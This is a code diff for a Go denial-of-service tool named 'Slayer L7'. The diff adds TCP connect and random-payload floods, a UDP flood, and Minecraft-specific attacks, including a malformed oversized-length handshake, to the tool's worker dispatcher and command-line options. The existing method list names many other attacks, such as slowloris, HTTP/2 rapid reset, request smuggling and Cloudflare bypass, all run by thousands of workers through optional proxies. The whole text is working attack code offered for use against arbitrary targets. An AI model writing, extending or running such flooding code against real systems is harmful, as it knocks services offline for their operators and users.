@@ -1653,6 +1653,91 @@ func httpPingback(targetURL string, client *http.Client) error {
     return nil
 }
 
+func tcpConnect(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "80"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    conn.Close()
+    recordStatus("Sent")
+    return nil
+}
+
+func tcpPayload(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "80"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    defer conn.Close()
+
+    payload := make([]byte, 1024)
+    rand.Read(payload)
+    _, err = conn.Write(payload)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    recordStatus("Sent")
+    return nil
+}
+
+func udpFlood(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "80"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    conn, err := net.Dial("udp", addr)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    defer conn.Close()
+
+    payload := make([]byte, 1024)
+    rand.Read(payload)
+    _, err = conn.Write(payload)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    recordStatus("Sent")
+    return nil
+}
+
 func mcPingFlood(targetURL string, stop <-chan struct{}) error {
     u, err := url.Parse(targetURL)
     if err != nil {
@@ -1758,6 +1843,86 @@ func mcBotJoin(targetURL string, stop <-chan struct{}) error {
     return nil
 }
 
+func mcBigPacket(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    defer conn.Close()
+
+    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(len(host))}
+    handshake = append(handshake, []byte(host)...)
+    portInt, _ := strconv.Atoi(port)
+    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
+    handshake = append(handshake, portBytes...)
+    handshake = append(handshake, 0x02)
+
+    pktLen := len(handshake)
+    packet := []byte{byte(pktLen)}
+    packet = append(packet, handshake...)
+
+    conn.Write(packet)
+
+    bigLen := []byte{0x80, 0x80, 0x80, 0x80, 0x08}
+    loginStartHeader := append([]byte{0x00}, bigLen...)
+    conn.Write(loginStartHeader)
+
+    smallPayload := make([]byte, 64)
+    rand.Read(smallPayload)
+    conn.Write(smallPayload)
+
+    recordStatus("Sent")
+    return nil
+}
+
+func mcLegacyPing(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    defer conn.Close()
+
+    legacyPing := []byte{0xFE, 0x01}
+    _, err = conn.Write(legacyPing)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    buf := make([]byte, 4096)
+    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+    conn.Read(buf)
+
+    recordStatus("Sent")
+    return nil
+}
+
 func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}, verbose bool, rateMS int) {
     client := clients[id%len(clients)]
     for {
@@ -1811,10 +1976,20 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpSmuggleCLTE(targetURL, stop)
         case "pingback":
             err = httpPingback(targetURL, client)
+        case "tcp_connect":
+            err = tcpConnect(targetURL, stop)
+        case "tcp_payload":
+            err = tcpPayload(targetURL, stop)
+        case "udp_flood":
+            err = udpFlood(targetURL, stop)
         case "mc_ping":
             err = mcPingFlood(targetURL, stop)
         case "mc_bot":
             err = mcBotJoin(targetURL, stop)
+        case "mc_bigpacket":
+            err = mcBigPacket(targetURL, stop)
+        case "mc_legacy":
+            err = mcLegacyPing(targetURL, stop)
         default:
             fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
             os.Exit(1)
@@ -1832,7 +2007,7 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
 
 func main() {
     target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
-    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, mc_ping, mc_bot")
+    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy")
     workerCount := flag.Int("w", 2048, "number of workers")
     dur := flag.Int("d", 30, "duration in seconds")
     pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
@@ -1843,7 +2018,7 @@ func main() {
     if *target == "" {
         fmt.Println("Slayer L7")
         fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
-        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | mc_ping | mc_bot")
+        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy")
         fmt.Println()
         flag.PrintDefaults()
         os.Exit(1)
@@ -1858,7 +2033,8 @@ func main() {
         "httpget": true, "httppost": true, "rudy": true, "apiflood": true, "rapidreset": true, "wsflood": true,
         "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true, "range": true, "cookiebomb": true,
         "chunkpost": true, "malformed": true, "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
-        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "mc_ping": true, "mc_bot": true,
+        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "tcp_connect": true, "tcp_payload": true, "udp_flood": true,
+        "mc_ping": true, "mc_bot": true, "mc_bigpacket": true, "mc_legacy": true,
     }
     if !validMethods[strings.ToLower(*method)] {
         fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
@@ -1867,7 +2043,7 @@ func main() {
 
     needsClientPool := true
     switch strings.ToLower(*method) {
-    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "mc_ping", "mc_bot":
+    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy":
         needsClientPool = false
     }
 
